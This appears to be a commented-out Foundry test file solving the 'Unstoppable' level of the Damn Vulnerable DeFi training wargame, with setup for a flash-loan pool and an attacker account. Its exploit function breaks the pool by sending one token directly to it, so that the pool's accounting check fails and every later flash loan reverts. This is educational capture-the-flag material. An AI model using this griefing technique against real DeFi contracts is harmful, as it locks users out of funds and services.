// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// import "../../src/unstoppable/UnstoppableVault.sol";
// import "../../src/unstoppable/ReceiverUnstoppable.sol";
// import "../../src/DamnValuableToken.sol";

// import {Utilities} from "../utils/Utilities.sol";
// import {BaseTest} from "../BaseTest.sol";
// import {stdError} from "forge-std/Test.sol";

// /**
// @dev run "forge test --match-contract Unstoppable" 
// */
// contract UnstoppableLenderTest is BaseTest {

//     uint TOKENS_IN_POOL = 1000000 ether;
//     uint INITIAL_ATTACKER_TOKEN_BALANCE = 100 ether;

//     DamnValuableToken token;
//     UnstoppableLender pool;
//     ReceiverUnstoppable receiverContract;

//     address payable attacker;
//     address payable someUser;

//     constructor() {
//         string[] memory labels = new string[](2);
//         labels[0] = "Attacker";
//         labels[1] = "Some User";

//         preSetup(2, labels);
//     }

//     function setUp() public override {
//         super.setUp();

//         attacker = users[0];
//         someUser = users[1];

//         // setup contracts
//         token = new DamnValuableToken();
//         pool = new UnstoppableLender(address(token));

//         // setup tokens
//         token.approve(address(pool), TOKENS_IN_POOL);
//         pool.depositTokens(TOKENS_IN_POOL);

//         token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

//         assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
//         assertEq(token.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

//         vm.startPrank(someUser);
//         receiverContract = new ReceiverUnstoppable(address(pool));
//         receiverContract.executeFlashLoan(10);
//         vm.stopPrank();
//     }

    
//     function test_Exploit() public {
//         runTest();
//     }

//     function exploit() internal override {
//         /** CODE YOUR EXPLOIT HERE */

//         vm.prank(attacker);
//         token.transfer(address(pool), 1);
//     }

//     function success() internal override {
//         /** SUCCESS CONDITIONS */

//         // It is no longer possible to execute flash loans
//         vm.expectRevert(stdError.assertionError);
//         vm.prank(someUser);
//         receiverContract.executeFlashLoan(10);
//     }
// }